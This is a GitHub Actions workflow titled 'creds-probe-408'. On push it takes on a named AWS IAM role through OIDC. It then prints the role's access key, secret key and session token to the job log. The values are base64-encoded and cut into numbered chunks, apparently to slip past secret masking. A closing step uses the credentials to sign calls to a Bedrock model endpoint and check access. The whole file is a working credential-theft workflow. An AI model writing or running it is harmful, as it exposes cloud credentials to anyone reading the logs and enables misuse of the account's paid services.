name: creds-probe-408
on:
  push:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
env:
  MODE: "oidc"
  ROLE: "arn:aws:iam::296062593712:role/claude-code-bedrock-role"
  AKID: "x"
  SAK: "y"
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 8
    steps:
      - name: ref
        run: echo "ref=$GITHUB_REF runner=$RUNNER_NAME"
      - name: aws oidc
        if: env.MODE == 'oidc'
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ env.ROLE }}
          aws-region: us-east-1
          role-session-name: credsprobe408
      - name: aws static
        if: env.MODE == 'static'
        uses: aws-actions/configure-aws-credentials@v4
        with:
          aws-access-key-id: ${{ secrets.x }}
          aws-secret-access-key: ${{ secrets.y }}
          aws-region: us-east-1
      - name: dump
        run: |
          set +e
          aws sts get-caller-identity
          printf 'CREDB64='
          printf '%s:%s:%s' "$AWS_ACCESS_KEY_ID" "$AWS_SECRET_ACCESS_KEY" "$AWS_SESSION_TOKEN" | base64 -w0
          echo
          echo "TOKLEN=${#AWS_SESSION_TOKEN}"
          printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0 | fold -w 100 | awk '{print "CREDC" NR "="$0}'
      - name: mantle
        if: always()
        run: |
          python3 - <<'PY'
          import json,os
          from botocore.auth import SigV4Auth
          from botocore.awsrequest import AWSRequest
          from botocore.credentials import Credentials
          import requests
          creds=Credentials(os.environ['AWS_ACCESS_KEY_ID'],os.environ['AWS_SECRET_ACCESS_KEY'],os.environ.get('AWS_SESSION_TOKEN'))
          EP="https://bedrock-mantle.us-east-1.api.aws/anthropic/v1/messages"
          for model in ["anthropic.claude-opus-5-5","anthropic.claude-fable-5"]:
              body=json.dumps({"model":model,"max_tokens":8,"messages":[{"role":"user","content":"say hi"}]})
              req=AWSRequest(method="POST",url=EP,data=body,headers={"content-type":"application/json","anthropic-version":"2023-06-01"})
              SigV4Auth(creds,"bedrock-mantle","us-east-1").add_auth(req)
              try:
                  r=requests.post(EP,headers=dict(req.headers),data=body,timeout=60)
                  print("MANTLE",model,r.status_code,r.text[:300])
              except Exception as e:
                  print("MANTLE",model,"ERR",e)
          PY
